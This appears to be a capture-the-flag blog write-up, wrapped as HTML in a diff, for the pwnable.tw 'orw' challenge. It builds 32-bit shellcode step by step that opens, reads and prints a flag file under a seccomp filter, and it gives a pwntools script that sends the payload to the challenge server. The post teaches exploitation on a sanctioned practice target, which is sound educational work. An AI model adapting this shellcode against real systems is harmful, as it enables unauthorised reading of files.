@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Pwnable.tw - orw [KCSC] :: Yet, another infosec blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Let&amp;rsquo;s have a quick and succinct write-up for orw - a challenge at pwnable.tw.
+" />
+<meta name="keywords" content="infosec, pwn, ctf, challenges, hackthebox, reverse" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://legiahuyy.github.io/blog/en/posts/kcsc-pwn-orw/" />
+
+
+
+
+<link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/style.css">
+
+  <link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://legiahuyy.github.io/blog/en/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://legiahuyy.github.io/blog/en/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="The Archivist" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Pwnable.tw - orw [KCSC]">
+<meta property="og:description" content="Let&amp;rsquo;s have a quick and succinct write-up for orw - a challenge at pwnable.tw.
+" />
+<meta property="og:url" content="https://legiahuyy.github.io/blog/en/posts/kcsc-pwn-orw/" />
+<meta property="og:site_name" content="Yet, another infosec blog" />
+
+  
+    <meta property="og:image" content="https://legiahuyy.github.io/blog/en/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+  <meta property="article:section" content="pwnable.tw" />
+
+
+  <meta property="article:published_time" content="2022-05-07 09:30:00 &#43;1345 &#43;1345" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/blog/en/">
+  <div class="logo">
+    <style>
+      .blink {
+        animation: blinker 1s linear infinite;
+        color: red!important;
+}
+.logo_anchor
+{
+  color: blue!important;
+}
+
+@keyframes blinker {
+  50% {
+    opacity: 0;
+  }
+}
+    </style>
+    <div class="logo_anchor">
+      ./&ThinSpace; 
+    </div>
+      Archivist
+    <div class="blink"> # </div> 
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/blog/en/posts">1.Posts</a></li>
+        
+      
+        
+          <li><a href="/blog/en/categories">2.Categories</a></li>
+        
+      
+        
+          <li><a href="/blog/en/tags">3.Tags</a></li>
+        
+      
+        
+          <li><a href="/blog/en/about">4.About</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">More ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/blog/en/sitemap.xml">RSS</a></li>
+              
+            
+              
+                <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/blog/en/posts">1.Posts</a></li>
+      
+    
+      
+        <li><a href="/blog/en/categories">2.Categories</a></li>
+      
+    
+      
+        <li><a href="/blog/en/tags">3.Tags</a></li>
+      
+    
+      
+        <li><a href="/blog/en/about">4.About</a></li>
+      
+    
+      
+        <li><a href="/blog/en/sitemap.xml">RSS</a></li>
+      
+    
+      
+        <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://legiahuyy.github.io/blog/en/posts/kcsc-pwn-orw/">Pwnable.tw - orw [KCSC]</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-05-07
+        
+      </span>
+    
+    
+      <span class="post-author">:: The Archivist</span>
+    
+    
+      <span class="post-reading-time">:: 4 min read (833 words)</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/write-up/">write-up</a>&nbsp;
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/pwn/">pwn</a>&nbsp;
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/radare2/">radare2</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        
+          Table of Contents
+        
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#footprinting">Footprinting</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
+        <li><a href="#sys_open---0x5">SYS_open - 0x5</a></li>
+        <li><a href="#sys_read---0x3">SYS_read - 0x3</a></li>
+        <li><a href="#sys_write---0x4">SYS_write - 0x4</a></li>
+      </ul>
+    </li>
+    <li><a href="#solvepy">Solve.py</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <p>Let&rsquo;s have a quick and succinct write-up for <strong>orw</strong> - a challenge at <a href="">pwnable.tw</a>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_20-07.png" alt=""></p>
+<h2 id="footprinting">Footprinting<a href="#footprinting" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Initially, we want to check the file for any notable properties (PIE, Canary, RELRO, etc.).</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_21-24.png" alt=""></p>
+<p>Based on the output above, there are no protection bits enabled within the binary (except for canary but it does not interfere with our payload afterwards) and therefore it is presumably believed to be quite simple as expected for a 100pts challenge.</p>
+<p>For now, we shall have a look into the disassembly code of <code>orw</code>:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_21-33.png" alt=""></p>
+<p>What the program does is rather straightforward, as it:</p>
+<ul>
+<li>calls <code>orw_seccomp</code> which basically allows only <code>SYS_open</code>, <code>SYS_read</code> and <code>SYS_write</code> to be executed thus limited our capability of calling low hanging fruit syscalls like <code>execve</code>, <code>system</code> or such</li>
+<li>reads input from STDIN (<code>SYS_read</code> with 200 bytes limit) and executes whatever it is as shellcode</li>
+</ul>
+<p>That being said, the author simply asks us to practice writing assembly and interacting with given syscalls.</p>
+<h2 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>According to what we have discussed, our shellcode needs to call <code>SYS_open</code> to open the flag at <code>/home/orw/flag</code>, then reads the content therein with <code>SYS_read</code> and finally pipe it to STDOUT using <code>SYS_write</code>. Keep in mind that syscalls have their own dedicated <em>ID</em>, herein <code>0x5</code>, <code>0x3</code>, <code>0x4</code> for <code>open</code>, <code>read</code> and <code>write</code>, respectively.</p>
+<p>You can read more about Linux syscalls and their respective assembly <a href="https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm">here</a>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_22-03.png" alt=""></p>
+<p>To call a syscall, simply push its ID into <code>EAX</code> then ask <code>INT</code> to execute it.</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">mov eax, 0x1	; 0x1 - SYS_exit
+int 0x80		; call it
+</code></pre><h3 id="sys_open---0x5">SYS_open - 0x5<a href="#sys_open---0x5" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">open</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pathname, <span style="color:#66d9ef">int</span> flags, mode_t mode);
+</code></pre></div><p>As demonstrated in the table and the syntax listed, <code>SYS_open</code> takes <code>ebx</code> as its filename, <code>ecx</code> as open access mode and <code>edx</code> as file permission. We thus need:</p>
+<ul>
+<li><code>EBX</code> holds the value of <code>/home/orw/flag</code></li>
+<li><code>ECX</code> could be <code>0</code> (<code>O_RDONLY</code> flag)</li>
+<li><code>EDX</code> is not necessary since it is a optional argument, we should leave it as <code>0</code></li>
+</ul>
+<p>Our shellcode for this syscall shall as follows:</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">push 0x6761		; ag
+push 0x6c662f77 ; w/fl
+push 0x726f2f65	; e/or
+push 0x6d6f682f	; /hom
+mov ebx, esp	; ESP now has the path /home/orw/flag
+xor ecx, ecx	; O_RDONLY
+xor edx, edx	; NULL
+mov eax, 0x5 	; SYS_open(ebp, ecx, edx)
+int 0x80
+</code></pre><p><strong>Note:</strong> It is not feasible to push the whole string <code>/home/orw/flag</code> but a 8-byte value onto the stack at once since the program is speaking x32 and that is the reason why we have to divide the string into four separate parts. Follow <a href="https://c9x.me/x86/html/file_module_x86_id_269.html">this link</a> for more information about PUSH instruction.</p>
+<p>You can convert the string in reverse using this recipe in <a href="https://gchq.github.io/CyberChef/#recipe=Reverse('Character')To_Hex('None',8)&amp;input=L2hvbQ">CyberChef</a>:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-07_09-21.png" alt=""></p>
+<h3 id="sys_read---0x3">SYS_read - 0x3<a href="#sys_read---0x3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssize_t <span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, size_t count);
+</code></pre></div><p>Follows the table and <code>read</code>&rsquo;s syntax:</p>
+<ul>
+<li><code>EBX</code> is now our file handle returned from <code>SYS_open</code> and stored in <code>EAX</code></li>
+<li><code>ECX</code> holds the buffer for the flag, it could point to any string register dubbed <code>ESI</code>, <code>EDI</code> or even <code>ESP</code></li>
+<li><code>EDX</code> is the maximum bytes our buffer shall have, <code>0x50</code> should be enough for the flag</li>
+</ul>
+<p>And we have the shellcode for <code>SYS_read</code>:</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">; ...
+mov ebx, eax	; eax has the handle of our file
+mov ecx, esp	; ecx now points to esp and uses it as the buffer
+mov edx, 0x50	; ... of 0x50 bytes in size
+mov eax, 0x3	; SYS_read(ebx, ecx, edx)
+int 0x80			
+</code></pre><h3 id="sys_write---0x4">SYS_write - 0x4<a href="#sys_write---0x4" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssize_t <span style="color:#a6e22e">write</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, size_t count);
+</code></pre></div><p>Same with those two above, we adhere to the table and its syntax:</p>
+<ul>
+<li><code>EBX</code> is file descriptor which indicates where the program would write and the register&rsquo;s value should be <code>1</code> - pipe directly to STDOUT</li>
+<li><code>ECX</code> needs to point to our flag and it is currently in <code>ESP</code> so we shall have it as that</li>
+<li><code>EDX</code> is the number of bytes to be written which returned from <code>SYS_read</code>, therefore it should be <code>EDX -&gt; EAX</code></li>
+</ul>
+<p>Our shellcode:</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">; ...
+mov edx, eax	; byte_written = eax
+mov ebx, 0x1	; stdout
+mov ecx, esp	; flag's buffer
+mov eax, 0x4	; SYS_write
+int 0x80
+</code></pre><h2 id="solvepy">Solve.py<a href="#solvepy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>In this final step, gather them all in one place - <code>solve.py</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./orw&#39;</span>)
+<span style="color:#75715e">#p = process([elf.path])</span>
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;chall.pwnable.tw&#39;</span>, <span style="color:#ae81ff">10001</span>)
+
+payload <span style="color:#f92672">=</span> asm(
+    <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">        push 0x6761
+</span><span style="color:#e6db74">        push 0x6c662f77
+</span><span style="color:#e6db74">        push 0x726f2f65
+</span><span style="color:#e6db74">        push 0x6d6f682f
+</span><span style="color:#e6db74">        mov ebx, esp
+</span><span style="color:#e6db74">        xor ecx, ecx
+</span><span style="color:#e6db74">        xor edx, edx
+</span><span style="color:#e6db74">        mov eax, 0x5
+</span><span style="color:#e6db74">        int 0x80
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">        mov ebx, eax
+</span><span style="color:#e6db74">        mov ecx, esp
+</span><span style="color:#e6db74">        mov edx, 0x50
+</span><span style="color:#e6db74">        mov eax, 0x3
+</span><span style="color:#e6db74">        int 0x80
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">        mov ecx, esp
+</span><span style="color:#e6db74">        mov edx, eax
+</span><span style="color:#e6db74">        mov ebx, 0x1
+</span><span style="color:#e6db74">        mov eax, 0x4
+</span><span style="color:#e6db74">        int 0x80
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">        push 0x1
+</span><span style="color:#e6db74">        pop eax
+</span><span style="color:#e6db74">        int 0x80
+</span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
+)
+
+print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Payload size: </span><span style="color:#e6db74">{</span>len(payload)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)  <span style="color:#75715e"># just to make sure our payload won&#39;t exceed 200 bytes limit</span>
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>The script shows that our payload has the size of 70 bytes and we have the flag subsequently. It is still worth mentioning that we can reduce the size of the payload by replacing <code>mov</code>  with <code>push; pop</code> instruction since the latter two only consist of 3 bytes in total whereas <code>mov</code> is of 5-bytes itself.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-07_09-28.png" alt=""></p>
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://legiahuyy.github.io/blog/en/posts/kcsc-ctf-2022-re-secret/">
+                <span class="button__text">KCSC CTF 2022: secret [RE]</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>© 2022 The Archivist</a>.</span>
+    
+        <span>All posts are licensed under <a href="https://creativecommons.org/licenses/by/4.0/legalcode">CC BY 4.0</a>.</span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://legiahuyy.github.io/blog/en/assets/main.js"></script>
+<script src="https://legiahuyy.github.io/blog/en/assets/prism.js"></script>
+
+
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script>
+const images = Array.from(document.querySelectorAll(".post-content img"));
+images.forEach(img => {
+  mediumZoom(img, {
+    margin: 0,  
+    background: '#222129',
+    scrollOffset: 40,  
+    container: null,  
+    template: null  
+  });
+});
+</script>
+
+
+  
+</div>
+
+</body>
+</html>
